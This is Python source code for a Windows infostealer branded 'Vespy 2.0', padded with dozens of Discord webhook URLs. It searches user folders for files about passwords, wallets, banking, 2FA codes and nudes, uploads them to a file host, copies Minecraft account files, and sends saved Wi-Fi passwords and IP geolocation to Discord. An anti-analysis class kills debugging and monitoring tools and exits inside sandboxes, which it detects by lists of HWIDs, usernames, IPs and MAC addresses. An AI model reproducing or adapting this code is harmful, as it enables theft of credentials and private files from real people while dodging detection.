webHOOK = 'https://ptb.discord.com/api/webhooks/1071773956639628924/Xf3Huevqbq6WfQHiQCfJ0eLlZWkvTF-x7OPBq5aIMDIbwZKLTj0j3iUwxAT-1i31J'
webh = 'https://discord.com/api/webhooks/1101181579974912880/CYpi7KzxmYVL4ctgLWeH1X7OTuBx-TbQ3bpoCPo_PINi6DwRyvntCGAF8MzE8vFd39'
webHOOK = 'https://discord.com/api/webhooks/1658069441041863752/V8jjJAH-KoC4t4x6_AtaOBHfeUdU0DI52pnkiJDr445GuH3jlbuaMDUGTi6bxCJLsg'
webHOOK = 'https://ptb.discord.com/api/webhooks/1493869977960229948/JTy6BGPmYVZQgIeV0yNoBtdF-JQe81qAAL7QECfmVy2nCEcG3nFPFSDfbD3T3SYJm'
thewebhook = 'https://canary.discord.com/api/webhooks/1130784102997790604/yCdfgSNu0BC1t0ujjRjWGTtBGWjyKL6vEBUB1v8btFyEnaz5xRuXdhd4bHEGSVCVLqG'
webHOOK = 'https://canary.discord.com/api/webhooks/1686802932630254893/jFdm8vhAglSL3u83bxfVh7V9ikNG9WAFSFCCa8MMCFqLimNfjla-xZKyOYOqgCTQUNat'
webh = 'https://discordapp.com/api/webhooks/1022442564070816681/NFjZpieopFV8FOhHV6KtJV6918cW_obdgf4V5W736ehCzB-feG2GeDcGe5mBU41pJwE'
fake_webhook = 'https://canary.discord.com/api/webhooks/1322602165496955717/PGQp9KoKz0ICeOAQxPqEFR17h2oK0dWB7RWf4gQWGxLjWT0jp3ujb0fNrV50xiuh42'
fake_webhook = 'https://ptb.discord.com/api/webhooks/1215425843734370337/4lsQBWvSlYn8R5LmrkWD-MV9wBwad9OefbSibjCTxBB10GyrR3KCXn-F0oexCHZJEWt'
webh = 'https://discordapp.com/api/webhooks/1613511954281041476/FPLocJrRsLDDQx1Z0R3OYI3587dTg_NKNfJ69ngeZ-s0mVN6kc3ND4fOPdQTaNGsEJv'
real_webhook = 'https://canary.discord.com/api/webhooks/1640136901067405320/tCq_048FrXZz_id46RnljiNKsBSxl1ZjcvTcVGPBkq_K8Z485Ep-zEtBp-Doy-KyN_VL'
thewebhook = 'https://ptb.discord.com/api/webhooks/1507628480587681214/s1D0oUMYt0NCDDOYeF5yqzlRi5lKRfc3vJMEjfqW_p2-bg-YOW7HI6j-CdwWSmbIVjwl'
webHOOK = 'https://canary.discord.com/api/webhooks/1620063873219649348/gyIHItzmD9HrTvZlJ8oEnX3eeuMz9PFDbJvi7BaF7f79Jv5utaIhj2JQoA31-2Eh5'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1115315749907077968/Q2c15_Bcs_QN3bj9WP5gRyY_7UR_L6wFSNylTdz9R8eP_fdjBaoe12TaMg3aoVuH9'
webHOOK = 'https://canary.discord.com/api/webhooks/1979490903904940649/T473agj9PqOdSutoJZApVCWawjgXMjw-eVtqKrrAWy0kx_upycVNYOybygrTQYzy6r5'

class Injection:
	pass
class Files:

    def __init__(self):
        self.ZIP = os.mkdir(f"C:\\Users\\{user}\\AppData\\Files")
        self.PTHAY = f"C:\\Users\\{user}\\AppData\\Files"
        self.folders = []
        self.files = 0
        self.filter = ["dll","jpg","jpeg","png","mp4","mp3","webm"]
        self.goal = ["token","webhook","password","passcode","crypto","wallet","money","school","homework","paypal","cashapp","cookies","account","bank","cash","creditcard","payment","2fa","2step","recovery","grab","nude","address","backup_codes"]
        paths = [f"{winshell.desktop()}",f"C:\\Users\\{user}\\Downloads",f"C:\\Users\\{user}\\Documents",f"C:\\Users\\{user}\\Videos",f"C:\\Users\\{user}\\Pictures",f"C:\\Users\\{user}\\Music"]
        for i in paths:
            self.Grab(i)
        self.upload_send()

    def Grab(self,_):
        try:
            if _ in self.folders:
                pass
            else:
                self.folders.append(_)
                files = os.listdir(_)
                for f in files:
                    if os.path.isdir(_+"\\"+f):
                        self.Grab(_+"\\"+f)
                    else:
                        for name in self.goal:
                            if name in f:
                                try:
                                    fname = f.split(".")[-0]
                                    fext = f.split(".")[-1]
                                    if fext not in tuple(self.filter):
                                        self.files +=1
                                        shutil.copy(_+"\\"+f,self.PTHAY+"\\"+fname+f"_{randint(1,999)}."+fext)
                                except:pass
        except:pass
    
    def upload_send(self):
        shutil.make_archive(f"C:\\Users\\{user}\\AppData\\Files","zip",f"C:\\Users\\{user}\\AppData\\Files")
        file = requests.post('https://api.anonfiles.com/upload',files={'file':open(f"C:\\Users\\{user}\\AppData\\Files.zip","rb")})
        link = file.json()['data']['file']['url']['full']
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
        embed = DiscordEmbed(title=f"File Grabber", description=f"User's File Grabbed", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        meowhehe = f""":open_file_folder: ``Files.zip``
``|_``:page_facing_up: ``({self.files}) Files Grabbed``
        """
        embed.add_embed_field(name=meowhehe, value=f"\n\n:file_folder: **ZIP with Grabbed files** : \n**{link}**")
        webhook.add_embed(embed)
        webhook.execute()
        os.remove(f"C:\\Users\\{user}\\AppData\\Files.zip");shutil.rmtree(f"C:\\Users\\{user}\\AppData\\Files")
class Minecraft:

    def __init__(self):
        try:
            self.files = 0
            os.mkdir(os.path.join(P4THF0LDR, "Minecraft"))
            self.minecraftfolder = os.path.join(P4THF0LDR, "Minecraft")
            path = f"C:\\Users\\{user}\\AppData\\Roaming\\.minecraft"
            self.Minycrafty(path)
        except:
            pass
    
    def Minycrafty(self, path):
        logs = ['launcher_accounts.json', 'usercache.json', 'launcher_profiles.json', 'launcher_log.txt']
        for i in logs:
            shutil.copy(path+"\\"+i,self.minecraftfolder+"\\"+i)
            self.files +=1
    
    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Minecraft``
``|   |_``:page_facing_up: ``({self.files}) Minecraft Files``"""
class Network:

    def __init__(self):
        self.WiFi()

    def IP(self):
        con = requests.get("http://ipinfo.io/json").json()
        self.ip = f"``{con['ip']}``"
        try:
            self.hostname = f"``{con['hostname']}``"
        except:self.hostname = ":x:"
        try:
            self.city = f"``{con['city']}``"
        except:
            self.city = ":x:"
        try:
            self.region = f"``{con['region']}``"
        except:
            self.region = ":x:"
        try:
            self.country = f"``{con['country']}``"
        except:
            self.country =":x:"
        try:
            self.location = f"``{con['loc']}``"
        except:
            self.location = ":x:"
        try:
            self.ISP = f"``{con['org']}``"
        except:
            self.ISP = ":x:"
        try:
            self.postal = f"``{con['postal']}``"
        except:
            self.postal = ":x:"

    def WiFi(self):
        self.IP()
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
        embed = DiscordEmbed(title=f"Network Info", description=f"User's Network Info", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f":ok_hand: IP : {self.ip}", value=f":label: Hostname: {self.hostname}\n:cityscape: City: {self.city}\n:park: Region: {self.region}\n:map: Country: {self.country}\n:round_pushpin: Location: {self.location}\n:pager: ISP: {self.ISP}\n:envelope: Postal: {self.postal}")
        webhook.add_embed(embed)
        webhook.execute()
        try:
            networks = re.findall("(?:Profile\s*:\s)(.*)", subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace"))
            for nets in networks:
                nets = nets.replace("\\r\\n","")
                res = subprocess.check_output(f"netsh wlan show profile {nets} key=clear",shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace")
                ssid = res.split("Type")[1].split(":")[1].split("\n")[0].split("\r")[0]
                key = res.split("Key Content")[1].split(":")[1].split("\n")[0].split("\r")[0]
                webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                embed = DiscordEmbed(title=f"Network Info", description=f"User's Network Info (MORE)", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_timestamp()
                embed.add_embed_field(name=f":thumbup: Wifi Network Found : ``{nets}``", value=f":man_tipping_hand: SSID: ``{ssid}``\n:scream: Password: ``{key}``")
                webhook.add_embed(embed)
                webhook.execute()
        except:pass
class Antidebug:

    def __init__(self):
        self.autoclose()
        self.HWIDS()
        self.username()
        self.pcnames()
        self.IPS()
        self.MACC()
        self.disk()

    def autoclose(self):
        for p in psutil.process_iter():
            if any(procstr in p.name().lower() for procstr in ['taskmgr','process','processhacker','ksdumper','fiddler','httpdebuggerui','wireshark','httpanalyzerv7','fiddler','decoder','regedit','procexp','dnspy','vboxservice','burpsuit']):
                try:p.kill()
                except:pass
    
    def HWIDS(self):
        try:
            hwid = str(subprocess.check_output('wmic csproduct get uuid')).replace(" ","").split("\\n")[1].split("\\r")[0]
        except:
            hwid = "wtf"
        SOME_SUSSY_HWIDS = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D','BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        for hwids in SOME_SUSSY_HWIDS:
            if hwids == hwid:
                os._exit(1)
    
    def username(self):
        usrname = os.getenv('UserName')
        USERNAMES = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A','lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise','User01', 'test', 'RGzcBUyrznReg']
        for usr in USERNAMES:
            if usr == usrname:
                os._exit(1)
    
    def pcnames(self):
        pcname = os.getenv('COMPUTERNAME')
        PCNAMES = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1','LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ','DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M','DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P','DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        for pcn in PCNAMES:
            if pcn == pcname:
                os._exit(1)

    def IPS(self):
        try:
            ip = str(requests.get("http://ipinfo.io/json").json()["ip"])
        except:
            ip = 'balls'
        IPPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116','34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151','195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50','109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143','34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97','34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167','193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        for IP in IPPS:
            if IP == ip:
                os._exit(1)
    
    def MACC(self):
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        MACS = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de','00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40','42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01','42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3','00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1','00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de','d4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02','42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3','96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77','3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d','00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e','00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8','3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20','3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7','94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de','7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33','00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06','2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d','00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        for Mac in MACS:
            if Mac == mac:
                os._exit(1)

    def disk(self):
        minDiskSizeGB = 50
        if len(sys.argv) > 1: minDiskSizeGB = float(sys.argv[1])
        _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
        diskSizeGB = diskSizeBytes/1073741824
        if diskSizeGB < minDiskSizeGB:
            try:
                os._exit(1)
            except:
                os._exit(1)
webHOOK = 'https://discord.com/api/webhooks/1284110198622463222/BAnLzx1HmiMq8F9tns8s2alqDetfcow185NlL3ALte8-w_WfAZ6T_oatlgt69g9iv'
webh = 'https://discordapp.com/api/webhooks/1067233186496763556/y6UoX9SRpXuF9UPkwgCnjV7vdY7fZ-gasVGTtc_p7Bmm4jVkcw2goXEK3RPUEGSZJct'
fake_wbh = 'https://canary.discord.com/api/webhooks/1742620727285692109/1ZRMEuum1z_3cf2mfv2lFlSdsYoreJtn1YhppzbixP9w7ZbMYLePxAv9R7N34QUbLi6-'
fake_webhook = 'https://discordapp.com/api/webhooks/1027706710068524713/O0_Vux39-Ew2lBjkiixTGcHePIdLJkpc03376tA-Kk2Rr_A1z8e_z_KJKjUmrN_iC'
webh = 'https://ptb.discord.com/api/webhooks/1887118254648707143/C01LfG7PqO0ZA_A6LMG4upm7m6UAkFOeidWm9eR7re75GKXKZOwTkzAZzSP2elC8TRq'
fake_wbh = 'https://canary.discord.com/api/webhooks/1414079031066995601/UBtGdtv0tE8TsrHPXNNYPgJV8utjgz6CEDiPdeDbkVTcAPU5AOEKqOLHKoFbimIag'
fake_wbh = 'https://canary.discord.com/api/webhooks/1485598798573511321/pnkxU676qFzKmAhP9lccALeUxCLz86b5f6xNUfCUSogLfl2TxieW9Np9xh7X-QQH0'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1706154424530512796/ZxbH-jmPX0ErcJmj0y_eao4VLw6TL-32Ztqkij2A3RGw_bd4kvaa4CIxUAxkCm2xGKeB'
fake_webhook = 'https://canary.discord.com/api/webhooks/1416257146827031473/k4KWxMO5xmhzx2aRZ65MXuLEwuhy-uTcwoM0owu0zjXyR8Pr8wQbJSAUyqR8GCAnSb'
fake_wbh = 'https://discordapp.com/api/webhooks/1377200513421698890/Vs1xsH8HAFTxtnrJrd4RLtfbfTZgLAInRNfVhZ66fb6Opja10b5PuO0QLca2Bsd233i'
real_webhook = 'https://discordapp.com/api/webhooks/1946338947579377057/bYhryEOB0KQ53jdK_Mhm9RNWdaNlIwBC4hnX2-FmGt79ej1txqR3X6NmOIq8_6fMTkzv'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1942893257084786712/zOdeUB6mqaTFL9AEm_YtfosjtBNgLfjZLsLsxoB8Awxxh13QerBgY0WFL8tzax4CuxLd'
webh = 'https://ptb.discord.com/api/webhooks/1649560592856723358/bCDBeG9ZYhP8xoGl3nC-C3EAjNceGtSW4zCC1rt-MOWIvRNqweQi5WrnJ3IcLlxTr0'
fake_wbh = 'https://discordapp.com/api/webhooks/1390139865334850521/2OhJUWGa9vm8HPAqGJHybVX9acQtxZseGG5glrL45UD3rCnv94YeX2kbGjzug37U32'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1442286973989448482/te44vVMd7QYiR6p3po4IcjOeKyt-Z03NsstMBU9qB12BMWVNXT4Mg_O4Pcr0mby_Sa'
fake_webhook = 'https://ptb.discord.com/api/webhooks/1099987506388412180/aTBypqJYn0V59AA2VFxCctYt-8DIrRl1YTl25u6F8vfG2fdCpMBFl8gw6BzUpx4OYQib'
webh = 'https://ptb.discord.com/api/webhooks/1436123556639873813/H0QVH6e8RWRrCEqAklDADETpXhxGINoB34UXbeEbrtjxVWhr0i0uabVBCmiwvDla4oEW'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1519236210197764241/2LYbinTDMsDSSQn4dAug7s-cJAN19ZRS5vzTOHvE5rkCiF_UZEdtz8QZU0sEdT_hBb'
fake_webhook = 'https://discord.com/api/webhooks/1800314854899599016/R_9l734Al_9Qzk8QtjyRHJop5aNNddL07kMLXgxcRTFukdP1lINh6YqhbhF16huOL'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1127643007275283023/_yr0KVYLk-wWoPrZsh5m3cheokGqiD462BmaK_wmoAgtBWbuvUjmS13njiRU-_16aXa'
thewebhook = 'https://ptb.discord.com/api/webhooks/1935895294983111645/3N6CgWEw0FhWvBXP54b5G8lYEkLawLKvRf-mXwcwYLRQ7jOoq1naEX_hFjLyHBiVZZ'
real_webhook = 'https://ptb.discord.com/api/webhooks/1674921776026273468/Qw3fc5JOYGvKjlXnsvdqSeU246yNUo3PWdiliJpBjo9HAdG6iWF8M4U0KIVEpte5z'
thewebhook = 'https://discordapp.com/api/webhooks/1699741242925257285/nuNN4mf5agsSHIF8bfdeqD96UUfSXg3c0bPtOJ-qKiIwig_bp8uDyTePeA8dAsOim'
thewebhook = 'https://discordapp.com/api/webhooks/1259506826590682435/7vVWMXwDUu1zH8U7O3jIHjgP3N30agps3OQy7hE8cIwZxTUzgFQcOX7UCiwr9qzro'
fake_webhook = 'https://canary.discord.com/api/webhooks/1789923960509617843/ygvbQrL34O1BAnEGI0EY3LFZ0ETozH__KKb4gCDNab8AeUT_FFfctOzzVCO7lmURRXob'
thewebhook = 'https://canary.discord.com/api/webhooks/1547581093353914723/XHIswivkJcjBcAOBYti7qx6MGGIGuSKn5Vcjyl0fU58X0AKkGMSGqkVEx0-JWt_Xh'
webh = 'https://canary.discord.com/api/webhooks/1455022002259035377/HPsojvpCJv7L3p5Uvj6PSMIUs-_Z6Ysk0DkS87PnIiLNY0G4R3Nbi5h0ihPoZ6Kw5bHQ'
fake_wbh = 'https://discord.com/api/webhooks/1846634441113052916/4DrexCDsA2eQk4t82s3ncuB9_XvqESxm3etz2H4FKXYO511HxmgS0JbEQMvGO3Pu7Y'
fake_webhook = 'https://discordapp.com/api/webhooks/1013506803013407856/hjns4ItTuzvrRFIwuVg0aDDwi40s7LdCi6eBplsb-tX28jo0tVx4d8-yYjlIFHQbvI'
webh = 'https://discordapp.com/api/webhooks/1026819632539143224/lJb5gBSR28vPxFByiulllTB3qnCQsEWHyzGbDSCHXDr9YzbW86knopHI--aCoQ4tm'
webHOOK = 'https://discordapp.com/api/webhooks/1619164414414028990/IouwuEEXQs43MGnlXMpDaZGir1Rg5k2AGhigXAfZlaKKsy5DI8WtJHvWageVOQVzwOx'
fake_wbh = 'https://discordapp.com/api/webhooks/1152891774386895071/KvaPHaTc_r8nh_KJedKFQkp7XKPa8-JyG5oRxt8Jj97eg-PQbxn2dLN_6bEEPC3cJq'
fake_webhook = 'https://discordapp.com/api/webhooks/1948587253293707307/1rVVIPqJQd-j4C6h8XSfJg6hKvY8HIvKlqxM3DF6Ld7n6UL0Yp7XHbBkkHxnt16KFbl'
real_webhook = 'https://ptb.discord.com/api/webhooks/1947214995957789751/SWaHBwV8E7EH9h3NvID5H3BP0n8kBH9eysj2vVbwICnQ3UVTzGCKmf8605y1xrniR-6'
